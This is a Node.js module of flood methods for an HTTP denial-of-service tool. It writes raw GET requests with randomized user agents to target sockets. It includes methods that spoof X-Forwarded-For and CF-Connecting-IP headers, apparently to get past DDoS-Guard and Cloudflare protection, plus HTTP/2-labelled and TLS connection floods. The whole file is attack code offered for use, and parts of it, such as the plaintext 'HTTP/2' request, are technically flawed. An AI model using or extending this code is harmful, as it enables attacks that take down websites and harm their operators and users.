const fs = require('fs');
const https = require('https');
const tls = require('tls');
const crypto = require('crypto');

const userAgents = fs.readFileSync('uas.txt', 'utf8').split('\n').filter(Boolean);

module.exports = {
    NORMAL: (socket, target, kbSize) => {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\n\r\n`;
        socket.write(payload);
    },

    DGB_BYPASS: (socket, target, kbSize) => {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Forwarded-For: ${crypto.randomBytes(4).join('.')}\r\n\r\n`;
        socket.write(payload);
    },

    CF_BYPASS: (socket, target, kbSize) => {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nCF-Connecting-IP: ${crypto.randomBytes(4).join('.')}\r\n\r\n`;
        socket.write(payload);
    },

    HTTP2_FLOOD: (socket, target, kbSize) => {
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const http2Payload = `GET ${target.pathname} HTTP/2\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\n\r\n`;
        socket.write(http2Payload);
    },

    TLS_FLOOD: (socket, target, kbSize) => {
        const tlsSocket = tls.connect({
            host: target.hostname,
            port: 443,
            servername: target.hostname,
        }, () => {
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            const payload = `GET ${target.pathname} HTTP/1.1\r\nHost: ${target.hostname}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\n\r\n`;
            tlsSocket.write(payload);
        });

        tlsSocket.on('error', (err) => {
            console.error(`TLS Flood Error: ${err.message}`);
        });
    },
};
